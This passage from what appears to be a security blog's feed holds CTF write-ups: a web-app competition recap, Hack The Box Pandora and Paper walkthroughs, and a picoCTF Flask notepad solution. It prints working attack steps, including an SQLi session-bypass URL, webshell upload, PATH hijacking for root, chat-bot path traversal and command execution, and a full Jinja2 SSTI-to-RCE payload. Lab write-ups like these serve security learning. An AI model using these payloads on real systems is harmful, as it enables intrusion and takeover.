<li>Session hijacking (to a very small extent)</li>
<li>XML/XPATH injection</li>
<li>Exploitation of client-side validation</li>
<li>Usage of hidden forms/weak validation</li>
<li>OSINT/Phishing</li>
</ul>
<p>Note: The scope was specifically the web application - shell access, if even possible, was out of scope.</p>
<p>The event ran for two weeks, with various hints and bonus assignments being dropped by the group running it along the way.</p>
<p>Overall, a pretty great package for someone who is getting into web app penetration testing like me!</p>
<h1 id="so-how-did-it-go">So how did it go?</h1>
<p>Well. <em>Too</em> well&hellip; Within the first few hours I&rsquo;d already dumped the entire backing database and gained admin privileges within the application.</p>
<p>As it turns out, the real challenge here is understanding <em>all of the vulnerabilities</em>, not just exploiting them.</p>
<p>Going back to the automated scoring, if you perform some basic SQLi, like an auth bypass, you&rsquo;ll probably get some points awarded for it, but what if you do something more malicious with that form like update some data or drop a table? That might also give some points&hellip; What if you do that again in a different form, or URL, etc on the site?</p>
<p>Effectively it was a few hours to pwn the application and database, and then another dozen or more hours of hunting down the ways the organizers <em>wanted</em> the application to be exploited. This lead to some really fun team work (which was explicitly permitted, we asked!) to do some divide and conquer on enumerating other vulnerabilities and challenges.</p>
<p>The other interesting thing here is that the 50+ &ldquo;flags&rdquo; <em>are not</em> enumerated from the start, so it&rsquo;s a hunt to exploit the application in any way you can, as well as trying to exploit it in ~50 different ways. You can imagine how surprised some of us were to find out that there were additional SQLi challenges that we hadn&rsquo;t found despite having already gone so far as giving ourselves infinite money and dropping the database.</p>
<h1 id="bonus-objectives">Bonus objectives</h1>
<p>One of the really fun parts of this event is that there were also <em>completely unknown</em> bonus challenges that could be scored. Effectively, if you could find a novel way of exploiting the application (e.g. session hijacking, persistent XSS, CSRF, Phishing, etc&hellip;) you could be awarded additional points from a hidden list that the organizers had.</p>
<p>While this meant that there was a <em>lot</em> of time spent trying to find novel approaches to things, and submitting them to the organizers for review, it did keep things quite fresh even after completing a vast majority of the base challenges.</p>
<p>I will note that one area here that was frustrating is that there were a small number of bonus objectives that were only available if you reviewed <em>out of scope</em> parts of the event, and you&rsquo;d only gain knowledge of them by intercepting traffic for said out of scope website. This was quite frustrating, but fortunately didn&rsquo;t come into play for overall standings - I&rsquo;ve of course politely shared this feedback with the organizers. With that said, I found all of these since they could be identified passively - no need to attack anything out of scope, just look closely at the traffic you receive when loading it.</p>
<p>N.B. There&rsquo;s a fun easter egg if you try to get a web shell via arbitrary file upload ;)</p>
<h1 id="final-standings">Final standings</h1>
<p>Out of ~140 folks who entered and completed at least some challenges, I landed in first place by about a 3% margin on score!</p>
<p>Given that this was my first &ldquo;competitive&rdquo; CTF event I&rsquo;m quite pleased, though it was certainly on the easier side compared to many of the boxes on HackTheBox/TryHackMe - at least in terms of understanding attack surface and getting a foothold/privilege escalation.</p>
<p>If any folks reading this have the opportunity to participate in one of the ShadowBank/Contoso Financial CTF events I&rsquo;d <em>highly</em> encourage it - especially if you&rsquo;re newer to &ldquo;hacking&rdquo;.</p>
<p>Now to wait for the prize swag to arrive. GG!</p>
]]></content></item><item><title>Hack The Box - Pandora</title><link>https://www.maclaren.dev/posts/2022-04/htb_pandora/</link><pubDate>Mon, 04 Apr 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-04/htb_pandora/</guid><description>Premise Second verse same as the first - we&amp;rsquo;re given an IP and no further information. Commence enumeration!
Enumeration To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.
Out of the gate we have a website talking about some random product. There&amp;rsquo;s nothing interactable, and nmap only gives us TCP 22 and 80 as open ports.
Fuzzing with ffuf and nikto turns up nothing actionable, just icons and asset directories, neither of which can be used for anything.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p>Second verse same as the first - we&rsquo;re given an IP and no further information. Commence enumeration!</p>
<h1 id="enumeration">Enumeration</h1>
<p>To set the stage, enumeration is probably the hardest part of this challenge. The rest is doable with some patience and research.</p>
<p>Out of the gate we have a website talking about some random product. There&rsquo;s nothing interactable, and <code>nmap</code> only gives us TCP 22 and 80 as open ports.</p>
<p>Fuzzing with <code>ffuf</code> and <code>nikto</code> turns up nothing actionable, just <code>icons</code> and <code>asset</code> directories, neither of which can be used for anything.</p>
<p>This is where I got stuck a bit initially, trying to fingerprint the web server further, find alternate hostnames for name-based virtual hosts, etc&hellip;but there&rsquo;s nothing, at least out of the gate.</p>
<p>From here, I decided to run a rather painstaking UDP scan with <code>nmap</code>, which turned up UDP 161:</p>
<pre><code>Discovered open port 161/udp on 10.10.11.136 
</code></pre><p>This wound up being SNMP v1, so we can try running <code>snmpwalk</code> against it. Not being overly familiar with this tool, I just took the default examples and ran against it to experiment- <code>snmpwalk -oS -c public -v 1 panda.htb</code>. Among other information, if you watch long enough (I mentioned patience&hellip;) this will pop up with:</p>
<pre><code>iso.3.6.1.2.1.25.4.2.1.5.843 = STRING: &quot;-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23
</code></pre><p>These credentials couldn&rsquo;t possibly work over SSH, could they? They do.</p>
<p>Unfortunately, our flag is not in the home dir of the user in question, but is unreadable in <code>/home/matt/</code>. On to other enumeration!</p>
<h1 id="foothold-but-no-real-traction">Foothold, but no real traction</h1>
<p>At this point we&rsquo;re on the box, we&rsquo;ve got reliable access over <code>ssh</code>, but we can&rsquo;t really do anything as the <code>daniel</code> user has little to no permissions.</p>
<p>We know we&rsquo;ve got an Apache server running, so let&rsquo;s see what else is running. Maybe there&rsquo;s another site that we couldn&rsquo;t enumerate earlier. As it turns out, there is another directory under <code>/var/www</code> - <code>pandoraconsole</code> but we can&rsquo;t hit it remotely. Looking at <code>/etc/apache/sites-enabled/pandora.conf</code> we can see that it&rsquo;s  <em>only</em> listens on <code>localhost</code> which is part of the reason we couldn&rsquo;t fuzz for it - and that it runs as <code>matt</code>, the user who has our first flag.</p>
<h1 id="opening-a-pandoras-box">Opening a Pandora&rsquo;s Box</h1>
<p>Since this will only respond on <code>localhost</code>, we&rsquo;ll need to proxy access. There are a few ways to do this, but SSH port forwarding is probably the easiest by far:</p>
<pre><code>ssh -L 80:localhost:80 panda.htb
</code></pre><p>Yep! We have a console. Maybe the same creds? Maybe, but says user can only use the API. Main site links us to docs that cover the API, but long story short there&rsquo;s no direct compromise available there - this is a deep rabbit hole.</p>
<p>What we do know at this point is that we&rsquo;ve got another possible attack surace - Pandora FMS v7.0NG.742_FIX_PERL2020, and some quick research turns up a few vulnerabilities - <a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a>.</p>
<p>Following up with <a href="https://github.com/ibnuuby/CVE-2021-32099,">https://github.com/ibnuuby/CVE-2021-32099,</a> we can run the example request and all of a sudden we have an active session as an admin.</p>
<pre><code>http://localhost:80/pandora_console/include/chart_generator.php?session_id=a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario%7Cs:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27=%271
</code></pre><p>At this point we&rsquo;ve got admin level access to this product, which must be an avenue for further compromise, but there&rsquo;s nothing immiediately obvious.</p>
<h1 id="can-we-put-things-in-the-box">Can we put things in the box?</h1>
<p>As it turns out, the one thing we <em>can</em> do in this product is perform arbitrary file uploads.</p>
<p>While the paths for these get hashed in so far as how they&rsquo;re returned in the file upload API, poking around the UI we can see some overlap between the images used to populate parts of the UI, logos, etc&hellip; and the contents of the directories that we&rsquo;re able to upload to. This means we&rsquo;ve likely got a predictable path for where our uploaded files will land.</p>
<p>While this doesn&rsquo;t let us do anything fun like SVG vulnerabilities, it does let us do something even more silly&hellip; upload a <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">PHP webshell</a>.</p>
<p>Were our theories about predictable paths correct? Yep! http://localhost/pandora_console/images/webshell.php - and it looks like we&rsquo;re running as <code>matt</code>. Let&rsquo;s get the user flag!</p>
<pre><code>cat /home/matt/user.txt
b7989...
</code></pre><h1 id="getting-root">Getting root</h1>
<p>Let&rsquo;s try to get a shell as <code>matt</code> by copying our public key into <code>authorized_keys</code> through the webshell.</p>
<pre><code>echo &lt;key&gt; &gt;&gt; /home/matt/.ssh/authorized_keys
</code></pre><pre><code>â  ssh matt@panda.htb                                   
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon  4 Apr 16:38:43 UTC 2022

  System load:  0.02              Processes:             234
  Usage of /:   63.2% of 4.87GB   Users logged in:       1
  Memory usage: 9%                IPv4 address for eth0: 10.10.11.136
  Swap usage:   0%

  =&gt; /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$ 

</code></pre><p>We are in!</p>
<p>The current run of the mill stuff like polkit vulnerabilities appear to have been patched, so no luck there, and we don&rsquo;t have any <code>sudo</code> privs. Nothing obvious gained here other than the user flag.</p>
<p>At this point I decided to take a step back and run <a href="https://github.com/DominicBreuker/pspy">pspy</a> for a few hours to see if anything interesting came up. While this gave me a few leads, there was nothing that was jumping out at me or lead to anything other than rabbit holes.</p>
<p>After letting <code>pspy</code> again run for a bit longer in the background and getting nowhere I decided to check for something simple - we we have any <code>setuid</code> flagged scripts/binaries that we could abuse?</p>
<pre><code>matt@pandora:/dev/shm$ find / -perm -4000 2&gt;/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/pandora_backup
/usr/bin/passwd
/usr/bin/mount
/usr/bin/su
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
</code></pre><p><code>pandora_backup</code> looks like a plant&hellip; what is it and can we use it?</p>
<pre><code>matt@pandora:/dev/shm$ ll /usr/bin/pandora_backup 
-rwsr-x--- 1 root matt 16816 Dec  3 15:58 /usr/bin/pandora_backup*
</code></pre><p>It&rsquo;s either a plant, or its our target. I&rsquo;m guessing the later. It&rsquo;s a binary though, so let&rsquo;s see what&rsquo;s in it&hellip; hopefully there are some plain text strings:</p>
<pre><code>PandoraFMS Backup Utility^@^@^@^@^@^@^@Now attempting to backup PandoraFMS client^@^@^@^@^@^@tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*^@Backup failed!
</code></pre><p>Ok, we can run with this&hellip; so it&rsquo;s trying to create a tar file, and it&rsquo;s not specifying the path to the executable. Can we abuse this with a <code>PATH</code> update?</p>
<pre><code>tar: Removing leading `/' from hard link targets
/var/www/pandora/pandora_console/COPYING
/var/www/pandora/pandora_console/DB_Dockerfile
</code></pre><p>It&rsquo;s definitely running <code>tar</code>. Let&rsquo;s update PATH with a malicious <code>tar</code> executable that&rsquo;s going to spawn a shell. Since this process runs as <code>root</code>, we should be able to get a <code>root</code> shell, right?</p>
<pre><code>matt@pandora:/dev/shm$ echo &quot;/bin/bash&quot; &gt; tar
matt@pandora:/dev/shm$ chmod +x tar 
matt@pandora:/dev/shm$ PATH=/dev/shm:$PATH
matt@pandora:/dev/shm$ echo $PATH
/dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</code></pre><p>Running <code>tar</code> as <code>matt</code> now gives us a new shell (as <code>matt</code>). Does this carry over into <code>pandora_backup</code>?</p>
<p>YES!</p>
<pre><code>matt@pandora:/dev/shm$ /usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
root@pandora:/dev/shm# whoami
root
root@pandora:/dev/shm# cat /root/root.txt 
18dd17ce1...
</code></pre><p>Time to clean up and get out! GG!</p>
]]></content></item><item><title>Hack The Box - Paper</title><link>https://www.maclaren.dev/posts/2022-04/htb_paper/</link><pubDate>Fri, 01 Apr 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-04/htb_paper/</guid><description>Premise As with all Hack The Box (HTB) Machines we&amp;rsquo;re given nothing more than an IP.
Initial target enumeration with nmap shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&amp;rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.
Further exploration Next step, after a lot of poking, prodding, fuzzing, etc&amp;hellip; and getting nowhere was to try out nikto to see if there&amp;rsquo;s anything else the webserver might be leaking for us.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p>As with all Hack The Box (HTB) <code>Machines</code> we&rsquo;re given nothing more than an IP.</p>
<p>Initial target enumeration with <code>nmap</code> shows us TCP 22, 80, and 443 open, with SSH and Apache 2.4.37 respectively. The TLS information returned isn&rsquo;t super helpful, and hitting the website gives us nothing more than the default CentOS Apache httpd page.</p>
<h1 id="further-exploration">Further exploration</h1>
<p>Next step, after a lot of poking, prodding, fuzzing, etc&hellip; and getting nowhere was to try out <code>nikto</code> to see if there&rsquo;s anything else the webserver might be leaking for us.</p>
<p>Fortunately there is - a potential host name of <code>office.paper</code> thanks to a <code>x-backend-server</code> header. Presumably this is for name-based virtual hosts with Apache, so let&rsquo;s add it to <code>/etc/hosts</code> with the target IP and see what we get.</p>
<p>Bingo. A wordpress blog.</p>
<h1 id="wordpress-moar-like-insecurepress-m-i-rite">wordpress? moar like insecurepress, m i rite?</h1>
<p>Joking aside, this is running an <em>ancient</em> version of Wordpress from back in 2019. This will become useful shortly.</p>
<p>From initial poking around there&rsquo;s no much of interest, other than the singular response to any of the blog posts there, and it&rsquo;s chastising the author for leaving sensitive data in drafts. Hmmm&hellip; Is there a way we can access those?</p>
<p><a href="https://www.exploit-db.com/exploits/47690">Yes, there is.</a>.</p>
<p>With this knowledge, we can just hit <a href="http://office.paper/?status=1">http://office.paper/?status=1</a> and right away we&rsquo;ve got the information we need to move to our next step - RocketChat.</p>
<h1 id="i-for-one-welcome-our-robot-overlords">I, for one, welcome our robot overlords</h1>
<p>After using the signup link from the draft, and getting access to RocketChat, there&rsquo;s some juicy info there about a chat bot that can be used to do various business things&hellip; but also, for some insane reason, to list files and get their contents. Ripe for exploitation.</p>
<p>We can get directory listings with <code>recyclops list sale</code> as the example, but as it turns out this also allows for relative paths.</p>
<pre><code>4:55 PM
recyclops list sale/../..
Bot
4:55 PM
Fetching the directory listing of sale
total 4
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 .
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 ..
-rw-r--r-- 1 dwight dwight 158 Sep 15 2021 portfolio.txt
Fetching the directory listing of sale/..
total 0
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 .
drwx------ 12 dwight dwight 323 Apr 1 16:26 ..
drwxr-xr-x 2 dwight dwight 27 Sep 15 2021 sale
drwxr-xr-x 2 dwight dwight 27 Jul 3 2021 sale_2
Fetching the directory listing of sale/../..
total 64
drwx------ 12 dwight dwight 323 Apr 1 16:26 .
drwxr-xr-x. 3 root root 20 Jan 14 06:50 ..
lrwxrwxrwx 1 dwight dwight 9 Jul 3 2021 .bash_history -&gt; /dev/null
-rw-r--r-- 1 dwight dwight 18 May 10 2019 .bash_logout
-rw-r--r-- 1 dwight dwight 141 May 10 2019 .bash_profile
-rw-r--r-- 1 dwight dwight 358 Jul 3 2021 .bashrc
-rwxr-xr-x 1 dwight dwight 1174 Sep 16 2021 bot_restart.sh
drwx------ 5 dwight dwight 56 Jul 3 2021 .config
-rw------- 1 dwight dwight 9 Apr 1 16:26 .dbshell
-rw------- 1 dwight dwight 16 Jul 3 2021 .esd_auth
drwx------ 3 dwight dwight 69 Apr 1 16:26 .gnupg
drwx------ 8 dwight dwight 4096 Sep 16 2021 hubot
-rw-rw-r-- 1 dwight dwight 18 Sep 16 2021 .hubot_history
-rwxrwxr-x 1 dwight dwight 25152 Apr 1 14:22 jeTNike
drwx------ 3 dwight dwight 19 Jul 3 2021 .local
drwxrwxr-x 2 dwight dwight 27 Apr 1 14:22 lol
drwxr-xr-x 4 dwight dwight 39 Jul 3 2021 .mozilla
drwxrwxr-x 5 dwight dwight 83 Jul 3 2021 .npm
drwxr-xr-x 4 dwight dwight 32 Jul 3 2021 sales
drwx------ 2 dwight dwight 29 Apr 1 16:07 .ssh
-r-------- 1 dwight dwight 33 Apr 1 14:12 user.txt
drwxr-xr-x 2 dwight dwight 24 Sep 16 2021 .vim
</code></pre><p>There&rsquo;s the user flag, let&rsquo;s see if we can get it.</p>
<pre><code>4:56 PM
recyclops file sale/../../user.txt
Bot
4:56 PM
Access denied. 
</code></pre><p>Nope! Let&rsquo;s see what else is there.</p>
<p>I see a <code>bot_restart.sh</code> script. Let&rsquo;s check it with <code>recyclops file sale/../../bot_restart.sh</code></p>
<pre><code> &lt;!=====Contents of file sale/../../bot_restart.sh=====&gt;
#!/bin/bash

# Cleaning hubot's log so that it won't grow too large.
echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log


# For starting the bot 20-ish (10+20) seconds late, when the server is restarted.
# This is because MongoDB and Rocket-Chat server needs some time to startup properly
sleep 10s

# Checks if Hubot is running every 10s
while [ 1 ];
do
sleep 20s
alive=$(/usr/sbin/ss -tulnp|grep 8000);
if [[ -n $alive ]]; then
err=$(grep -i 'unhandled-rejections=strict' /home/dwight/hubot/.hubot.log)
if [[ -n $err ]]; then
# Restarts bot
echo &quot;[-] Bot not running!
date&quot;;
#Killing the old process
pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
kill -9 $pid;
cd /home/dwight/hubot;
# Cleaning hubot's log so that it won't grow too large.
echo &quot;&quot; &gt; /home/dwight/hubot/.hubot.log
bash /home/dwight/hubot/start_bot.sh&amp;
else


echo &quot;[+] Bot running succesfully! date&quot;;
fi

else
# Restarts bot
echo &quot;[-] Bot not running! date
&quot;;
#Killing the old process
pid=$(ps aux|grep -i 'hubot -a rocketchat'|grep -v grep|cut -d &quot; &quot; -f6);
kill -9 $pid;
cd /home/dwight/hubot;
bash /home/dwight/hubot/start_bot.sh&amp;
fi

done
&lt;!=====End of file sale/../../bot_restart.sh=====&gt;
</code></pre><p>Ok, looks like the bot stuff is all under <code>/home/dwight/hubot</code>, let&rsquo;s see what it can do.</p>
<p>We can see what scripts it can run with <code>recyclops list ../hubot/scripts/</code> which shows us a <code>cmd.coffee</code>.</p>
<pre><code> &lt;!=====Contents of file ../hubot/scripts/cmd.coffee=====&gt;
# Description:
# Runs a command on hubot
# TOTAL VIOLATION of any and all security!
#
# Commands:
# hubot cmd &lt;command&gt; - runs a command on hubot host

module.exports = (robot) -&gt;
robot.respond /CMD (.*)$/i, (msg) -&gt;
# console.log(msg)
@exec = require('child_process').exec
cmd = msg.match[1]
msg.send &quot;Running [#{cmd}]...&quot;

@exec cmd, (error, stdout, stderr) -&gt;
if error
msg.send error
msg.send stderr
else
msg.send stdout
# Description:
# Runs a command on hubot
# TOTAL VIOLATION of any and all security!
#
# Commands:
# hubot cmd &lt;command&gt; - runs a command on hubot host

module.exports = (robot) -&gt;
robot.respond /CMD (.*)$/i, (msg) -&gt;
# console.log(msg)
@exec = require('child_process').exec
cmd = msg.match[1]
msg.send &quot;Running [#{cmd}]...&quot;

@exec cmd, (error, stdout, stderr) -&gt;
if error
msg.send error
msg.send stderr
else
msg.send stdout
&lt;!=====End of file ../hubot/scripts/cmd.coffee=====&gt;
</code></pre><p>What does it do? Exactly what you think&hellip; RCE, but at least it&rsquo;s scoped to a non-root user.</p>
<pre><code>5:02 PM
recyclops cmd whoami
Bot
5:02 PM
Running [whoami]...
Running [whoami]...
dwight
dwight
</code></pre><p>We can use this to get the <code>user.txt</code> flag as a starting point with <code>recyclops cmd cat /home/dwight/user.txt</code>:</p>
<pre><code> Running [cat /home/dwight/user.txt]...
c1ff88de...
</code></pre><h1 id="foothold--root">Foothold &amp; <code>root</code></h1>
<p>We can add our own public key into <code>dwight</code>&rsquo;s authorized keys with this and use that as a starting point:</p>
<pre><code>recyclops cmd echo ssh-rsa &lt;key goes here&gt; &gt;&gt; /home/dwight/.ssh/authorized_keys
</code></pre><p>And we&rsquo;re in with a stable shell.</p>
<pre><code>[dwight@paper ~]$
</code></pre><p><em>Note</em>: Another approach here could be use <code>recyclops</code> to spawn a reverse shell. While that <em>might</em> be better for not leaving fingerprints (literally our SSH public key), it means we have to deal with getting a stable shell from there. This is easier, and for a CTF I&rsquo;ll take that tradeoff.</p>
<p>Now that we&rsquo;re in, we can see that <code>dwight</code> has no <code>sudo</code> privs - prompting for a password just to run <code>sudo -l</code>, so that&rsquo;s a no go.</p>
<p>Let&rsquo;s just go for the gold <a href="https://github.com/Almorabea/Polkit-exploit/blob/main/CVE-2021-3560.py">with <code>polkit</code> sploitz</a> and see if it works.</p>
<p>Yep.</p>
<pre><code>[root@paper shm]#
[root@paper shm]# cat /root/root.txt
7402782...
</code></pre><p>Time to clean up and get out - delete the <code>authorized_keys</code> entry, delete the <code>polkit</code> exploit script, and clear history.</p>
<p>GG!</p>
]]></content></item><item><title>picoCTF - notepad</title><link>https://www.maclaren.dev/posts/2022-03/pico_notepad/</link><pubDate>Sat, 26 Mar 2022 00:00:00 +0000</pubDate><guid>https://www.maclaren.dev/posts/2022-03/pico_notepad/</guid><description>Premise We&amp;rsquo;re given a service that will take abitrary input, and render it as an HTML page.
There are a few restrictions:
Content cannot be longer than 512 characters Content cannot include _ or / characters Lastly, from the Dockerfile we know that the flag is going to have an arbtirary name starting with flag-.
Examining the tarball This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</description><content type="html"><![CDATA[<h1 id="premise">Premise</h1>
<p>We&rsquo;re given a service that will take abitrary input, and render it as an HTML page.</p>
<p>There are a few restrictions:</p>
<ul>
<li>Content cannot be longer than 512 characters</li>
<li>Content cannot include <code>_</code> or <code>/</code> characters</li>
</ul>
<p>Lastly, from the <code>Dockerfile</code> we know that the flag is going to have an arbtirary name <em>starting with</em> <code>flag-</code>.</p>
<h1 id="examining-the-tarball">Examining the tarball</h1>
<p>This challenge comes with a tarball that contains the source code so we can do some white box analysis of how all of this works.</p>
<p>At a high level, we can see that this is a Flask app (SSTI&hellip;?), and that we&rsquo;ve got a flag, and <code>static</code> and <code>templates/errors</code> directories.</p>
<p>From <code>app.py</code>, we can see how some of the application logic is enforced:</p>
<pre><code>def create():
    content = request.form.get(&quot;content&quot;, &quot;&quot;)
    if &quot;_&quot; in content or &quot;/&quot; in content:
        return redirect(url_for(&quot;index&quot;, error=&quot;bad_content&quot;))
    if len(content) &gt; 512:
        return redirect(url_for(&quot;index&quot;, error=&quot;long_content&quot;, len=len(content)))
    name = f&quot;static/{url_fix(content[:128])}-{token_urlsafe(8)}.html&quot;
    with open(name, &quot;w&quot;) as f:
        f.write(content)
    return redirect(name)
</code></pre><p>We&rsquo;re taking arbitrary input from the form in <code>index.html</code>, checking if it contains <code>_</code> or <code>/</code> (throw a <code>bad_content</code> error if so), then checking if it is &gt; 512 charactersx in length (throw a <code>long_content</code> error if so.</p>
<p>From there, a name for the resultant file is generated using the <em>first 128 characters of the content</em> (!!), and then an arbitrary random suffix to avoid collisions.</p>
<p>Lastly, the file is written out, and the user is redirected to it.</p>
<h1 id="where-do-we-start">Where do we start?</h1>
<p>First off, since we&rsquo;re generating a filename using only the first 128 characters, we can use that as padding, e.g. content of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678foobarbaz</code> will give us a file name of <code>12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-pGVBCkNvTLY.html</code>. For whatever we want to include so that it won&rsquo;t break the URL (e.g. if we wanted to use iframes to try to retrieve other content, relative pages, etc&hellip;). This may or may not be useful, but at face value cannot be used to retrieve content outside of the <code>static</code> dir.</p>
<p>If we try to do something simple like creating a new file outside of the <code>static</code> subdir, we&rsquo;ll just get a 500 error. For example, submitting content of <code>..\templates\foo.html</code> just results in <code>Internal Server Error</code> and no file creation. Similarly, attempts at LFI outside of the scope of the <code>static</code> dir through <code>iframes</code> will 404.</p>
<p>The attack surface as far as I can see it at this point is to try to do something like add a new error page, or overwrite the existing error pages (this should be possible due to how the file is being opened, <code>w</code>), with content that will allow us to gain further access.</p>
<h1 id="what-does-traffic-look-like">What does traffic look like?</h1>
<p>If we proxy traffic through Burp (or anything similar), we&rsquo;re just doing a basic POST with a <code>content</code> parameter:</p>
<pre><code>POST /new HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://localhost:8000
Connection: close
Referer: http://localhost:8000/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1


content=foobar
</code></pre><p>Good news is this is easy enough for us to play with in Repeater &amp; Intruder if we wanted to, but in retrospect it won&rsquo;t save much time.</p>
<h1 id="error-templates">Error templates</h1>
<p>Another factor here is that looking at the error templates, these are included <em>based on a URL parameter</em>, so again, if we can create a new template, it&rsquo;s trivial for us to call it.</p>
<p>For example, running the docker container, if we write out an arbitrary <code>templates/errors/foo.html</code> file that contains whatever we want, we can just call it from <code>http://localhost:8000/?error=foo</code>.</p>
<p>But how do we do this&hellip;?</p>
<p>The first lead is that the application is using <code>url_fix</code>, which is going to change <code>\</code> characters to <code>/</code> for us, so that part of the content filtering is irrelevant. If we try a payload of <code>..\templates\errors\</code> we get some curious behaviour&hellip; the returned URL is <code>http://localhost:8000/templates/errors/-AkAtr82ZpXU.html</code>, and if we look at the local filesystem:</p>
<pre><code>root@bb0be7618f85:/app# ls templates/errors/
-AkAtr82ZpXU.html  bad_content.html  long_content.html
</code></pre><p>We have a way to create arbitrary files! We also know that we can manage the creation of the filename, and that content beyond the 128th character (but under 512) is entirely under our control.</p>
<p>Let&rsquo;s try a payload of:</p>
<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678

foobarbaz
</code></pre><p>Predictably, this will 404, but we get a returned URL of <code>http://localhost:8000/templates/errors/123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI.html</code>. Since we know this file <em>will</em> exist on the file system, we can also now try calling it as an error since we know the filename in whole by hitting <code>http://localhost:8000/?error=123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI</code>.</p>
<p>Sure enough, the full content is returned in the page content!</p>
<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-ZyKmdETiOlI
..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz
make a new note
...
</code></pre><h1 id="ssti">SSTI?</h1>
<p>We&rsquo;ve got the ability to create arbitrary files, with content we <em>largely</em> control. Let&rsquo;s explore this further and see what vulnerabilities there are. To start, let&rsquo;s try a typical <code>{{ 7 * 7 }}</code> payload after our padding.</p>
<p>The rendered content?</p>
<pre><code>..\templates\errors\12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 49 
</code></pre><p>Note that 49! Woohoo! Alright, we know we can&rsquo;t include <code>_</code> characters in the content, but can we encode this in a different way? Perhaps a hex <code>\x5f</code>? Yes!</p>
<pre><code>{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()}}
</code></pre><p>Sure enough, this also includes <code>&lt;class 'subprocess.Popen'&gt;</code> (position 273 in my case), so we&rsquo;re in business.</p>
<h1 id="time-for-rce">Time for RCE!</h1>
<p>With the hex form of <code>_</code> unfiltered, and access to <code>subprocess.Popen</code> we can use the following payload to proce out RCE:</p>
<pre><code>..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 {{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(273)('ls',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}
</code></pre><p>Pass the resulting error page filename (minus URL) into <code>localhost:8000/?error=&lt;namehere&gt;</code>, and we get:</p>
<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-gt_Z1Bro-iE
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 app.py flag-bae52e25-3397-45de-8f53-f9e9a1d6a416.txt static templates 
</code></pre><p>And with one final tweak to run <code>cat flag*</code> instead of <code>ls</code>:</p>
<pre><code> error: 123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678-WRn7y2p0oMg
..\templates\errors\123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678 foobarbaz 
